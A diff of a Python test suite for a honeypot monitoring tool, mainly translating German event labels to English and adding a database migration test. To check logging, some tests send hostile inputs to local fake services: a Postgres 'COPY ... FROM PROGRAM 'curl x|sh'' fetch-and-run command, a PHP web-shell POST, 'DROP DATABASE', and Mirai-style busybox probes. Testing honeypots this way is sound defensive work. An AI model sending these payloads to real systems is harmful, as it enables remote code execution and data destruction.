@@ -3,6 +3,7 @@ import http.client
 import json
 import os
 import socket
+import sqlite3
 import struct
 import tempfile
 import threading
@@ -24,7 +25,7 @@ import sensors
 import stats
 import visits
 from server import mask
-from store import Store
+from store import Store, modernize
 
 NOW = time.mktime((2026, 10, 20, 12, 0, 0, 0, 0, -1))
 
@@ -63,12 +64,38 @@ class ParserTests(unittest.TestCase):
         ev = parsers.parse_nginx_error("2026/10/20 01:39:08 [crit] 549#549: *10928 SSL_do_handshake() failed "
                                        "(SSL: error:0A00006C:SSL routines::bad key share) while SSL handshaking, "
                                        "client: 118.194.251.101, server: 0.0.0.0:443")
-        self.assertEqual((ev["type"], ev["detail"]), ("SSL-Scan", "TLS-Handshake: bad key share"))
+        self.assertEqual((ev["type"], ev["detail"]), ("SSL-Scan", "TLS handshake: bad key share"))
 
     def test_syslog_year_rollover(self):
         jan = time.mktime((2027, 1, 1, 0, 10, 0, 0, 0, -1))
         ts = parsers.syslog_ts("Dec 31 23:59:00", jan)
         self.assertLess(ts, jan)
+
+
+class LegacyFormatTests(unittest.TestCase):
+    OLD = ["Login-Versuch als „root“ · Passwort „a”b“", "Befehl „uname -a“", "Login-Versuch als „(leer)“",
+           "Sample „ab“ · 9 B · Skript · x · nicht gespeichert (Speicher voll)", "Gebannt durch Jail sshd"]
+    NEW = ["Login attempt as “root” · password “a\"b”", "Command “uname -a”", "Login attempt as “(empty)”",
+           "Sample “ab” · 9 B · script · x · not stored (storage full)", "Banned by jail sshd"]
+
+    def test_old_sensor_events_are_translated_on_insert(self):
+        store = Store(":memory:")
+        store.add_events([parsers.event(1, "1.2.3.4", "SSH-Probe", "high", "honeypot", 22, d) for d in self.OLD])
+        self.assertEqual([r[0] for r in store.query("SELECT detail FROM events ORDER BY id")], self.NEW)
+        self.assertEqual([modernize(d) for d in self.NEW], self.NEW)  # idempotent
+
+    def test_existing_database_is_migrated_once(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            path = os.path.join(tmp, "x.db")
+            Store(path).db.execute("PRAGMA user_version=0")
+            db = sqlite3.connect(path)
+            db.executemany("INSERT INTO events(ts, ip, type, detail) VALUES (1, '1.2.3.4', 'SSH-Probe', ?)",
+                           [(d,) for d in self.OLD])
+            db.commit()
+            db.close()
+            store = Store(path)
+            self.assertEqual([r[0] for r in store.query("SELECT detail FROM events ORDER BY id")], self.NEW)
+            self.assertEqual(store.query("PRAGMA user_version")[0][0], 1)
 
 
 class StoreStatsTests(unittest.TestCase):
@@ -78,7 +105,7 @@ class StoreStatsTests(unittest.TestCase):
         self.store.add_events([
             parsers.event(now - 10, "1.2.3.4", "Port-Scan", "med", "portsentry", 22, "TCP SYN"),
             parsers.event(now - 20, "1.2.3.4", "Port-Scan", "med", "portsentry", 22, "TCP SYN"),
-            parsers.event(now - 30, "5.6.7.8", "SSH-Brute", "high", "sshd", 22022, "Login-Versuch als „root“"),
+            parsers.event(now - 30, "5.6.7.8", "SSH-Brute", "high", "sshd", 22022, "Login attempt as “root”"),
         ])
         self.store.save_geo([("1.2.3.4", 1, 2, "DE", "Germany", "Berlin", "ISP", "AS1", now, "Org", 1, 0, 0)])
 
@@ -229,13 +256,13 @@ class MySQLHoneypotTests(HoneypotBase):
             sock.sendall(honeypot_mysql.packet(0, b"\x03DROP DATABASE wordpress"))
             self.assertEqual(honeypot_mysql._read_packet(sock)[1][:1], b"\x00")
         rows = self.wait_events(3)
-        self.assertEqual(rows[0], ("MySQL-Probe", "high", "Login-Versuch als „root“ · DB „wordpress“"))
-        self.assertEqual([r[2] for r in rows[1:]], ["Befehl „show databases“", "Befehl „DROP DATABASE wordpress“"])
+        self.assertEqual(rows[0], ("MySQL-Probe", "high", "Login attempt as “root” · DB “wordpress”"))
+        self.assertEqual([r[2] for r in rows[1:]], ["Command “show databases”", "Command “DROP DATABASE wordpress”"])
         self.assertEqual(stats.compute(self.store, "24h")["usersTop"][0]["user"], "root")
 
     def test_scan_without_login(self):
         self.connect().close()
-        self.assertEqual(self.wait_events(1)[0][1:], ("low", "Verbindung ohne Login (Server-Erkennung)"))
+        self.assertEqual(self.wait_events(1)[0][1:], ("low", "Connection without login (service detection)"))
 
 
 class PostgresHoneypotTests(HoneypotBase):
@@ -261,8 +288,8 @@ class PostgresHoneypotTests(HoneypotBase):
             sock.sendall(honeypot_postgres.message(b"Q", b"COPY t FROM PROGRAM 'curl x|sh'\0"))
             self.assertEqual(self.read(sock), (b"C", b"COPY 0\0"))
         rows = self.wait_events(2)
-        self.assertEqual(rows[0], ("Postgres-Probe", "high", "Login-Versuch als „postgres“ · Passwort „geheim123“"))
-        self.assertEqual(rows[1], ("Postgres-Probe", "crit", "Befehl „COPY t FROM PROGRAM 'curl x|sh'“"))
+        self.assertEqual(rows[0], ("Postgres-Probe", "high", "Login attempt as “postgres” · password “geheim123”"))
+        self.assertEqual(rows[1], ("Postgres-Probe", "crit", "Command “COPY t FROM PROGRAM 'curl x|sh'”"))
         top = stats.compute(self.store, "24h")
         self.assertEqual((top["passwordsTop"][0]["password"], top["commandsTop"][0]["command"]),
                          ("geheim123", "COPY t FROM PROGRAM 'curl x|sh'"))
@@ -276,10 +303,10 @@ class FTPHoneypotTests(HoneypotBase):
         with socket.create_connection(("127.0.0.1", self.pot.port), timeout=5) as sock:
             lines = sock.makefile("rb")
             self.assertTrue(lines.readline().startswith(b"220"))
-            sock.sendall("USER admin\r\nPASS 123„456“\r\nQUIT\r\n".encode())
+            sock.sendall("USER admin\r\nPASS 123“456”\r\nQUIT\r\n".encode())
             replies = [lines.readline()[:3] for _ in range(3)]
         self.assertEqual(replies, [b"331", b"530", b"221"])
-        self.assertEqual(self.wait_events(1), [("FTP-Probe", "high", 'Login-Versuch als „admin“ · Passwort „123"456"“')])
+        self.assertEqual(self.wait_events(1), [("FTP-Probe", "high", 'Login attempt as “admin” · password “123"456"”')])
         s = stats.compute(self.store, "24h")
         self.assertEqual(s["passwordsTop"], [{"password": '123"456"', "n": 1}])
         self.assertEqual(self.store.events_where("password", '123"456"', 0)[0], 1)
@@ -306,8 +333,8 @@ class PHPHoneypotTests(HoneypotBase):
         self.request("POST", "/wp-login.php", "log=admin&pwd=geheim%21")
         self.request("POST", "/x/shell.php?c=id", "<?php system('id'); ?>")
         rows = self.wait_events(2)
-        self.assertEqual(rows[0], ("PHP-Probe", "high", "Login-Versuch als „admin“ · Passwort „geheim!“"))
-        self.assertEqual(rows[1], ("PHP-Probe", "crit", "Befehl „POST /x/shell.php c=id <?php system('id'); ?>“"))
+        self.assertEqual(rows[0], ("PHP-Probe", "high", "Login attempt as “admin” · password “geheim!”"))
+        self.assertEqual(rows[1], ("PHP-Probe", "crit", "Command “POST /x/shell.php c=id <?php system('id'); ?>”"))
         self.assertEqual(self.store.query("SELECT DISTINCT ip, port FROM events"), [("203.0.113.7", 443)])
 
 
@@ -347,11 +374,11 @@ class SSHHoneypotTests(HoneypotBase):
         rows = [r for r in self.wait_events(5) if r[0] == "Malware-Sample"]
         self.assertEqual(len(rows), 2, rows)
         digest = samples.hashlib.sha256(elf).hexdigest()
-        self.assertEqual(rows[0][2], f"Sample „{digest}“ · {len(elf)} B · ELF ARM · scp bot.arm")
-        self.assertTrue(rows[1][2].endswith("· Skript · cat > .s; chmod +x .s"))
+        self.assertEqual(rows[0][2], f"Sample “{digest}” · {len(elf)} B · ELF ARM · scp bot.arm")
+        self.assertTrue(rows[1][2].endswith("· script · cat > .s; chmod +x .s"))
         self.assertEqual(open(os.path.join(SAMPLES.name, digest), "rb").read(), elf)
         top = stats.compute(self.store, "24h")["samplesTop"]
-        self.assertEqual({(s["kind"], s["n"]) for s in top}, {("ELF ARM", 1), ("Skript", 1)})
+        self.assertEqual({(s["kind"], s["n"]) for s in top}, {("ELF ARM", 1), ("script", 1)})
         self.assertEqual(self.store.events_where("sample", digest, 0)[0], 1)
 
     def test_key_denied_password_accepted_commands_recorded(self):
@@ -371,9 +398,9 @@ class SSHHoneypotTests(HoneypotBase):
         self.assertIn("XQZ: applet not found", out)
         client.close()
         rows = self.wait_events(3)
-        self.assertEqual(rows[0][2], f"Login-Versuch als „root“ · Schlüssel ssh-rsa {honeypot_ssh.fingerprint(key)}")
-        self.assertEqual(rows[1], ("SSH-Probe", "high", "Login-Versuch als „root“ · Passwort „toor“"))
-        self.assertEqual(rows[2], ("SSH-Probe", "crit", "Befehl „uname -a; /bin/busybox XQZ“"))
+        self.assertEqual(rows[0][2], f"Login attempt as “root” · key ssh-rsa {honeypot_ssh.fingerprint(key)}")
+        self.assertEqual(rows[1], ("SSH-Probe", "high", "Login attempt as “root” · password “toor”"))
+        self.assertEqual(rows[2], ("SSH-Probe", "crit", "Command “uname -a; /bin/busybox XQZ”"))
         s = stats.compute(self.store, "24h")
         self.assertEqual(s["passwordsTop"], [{"password": "toor", "n": 1}])
         self.assertEqual(s["commandsTop"], [{"command": "uname -a; /bin/busybox XQZ", "n": 1}])
@@ -406,8 +433,8 @@ class TelnetHoneypotTests(HoneypotBase):
                 out += chunk
         self.assertIn(b"MIRAI: applet not found", out)
         self.assertEqual([r[1:] for r in self.wait_events(4)], [
-            ("high", "Login-Versuch als „admin“ · Passwort „1234“"), ("crit", "Befehl „enable“"),
-            ("crit", "Befehl „/bin/busybox MIRAI“"), ("crit", "Befehl „exit“")])
+            ("high", "Login attempt as “admin” · password “1234”"), ("crit", "Command “enable”"),
+            ("crit", "Command “/bin/busybox MIRAI”"), ("crit", "Command “exit”")])
 
     def test_echo_dropper_is_saved_after_disconnect(self):
         with socket.create_connection(("127.0.0.1", self.pot.port), timeout=5) as sock:
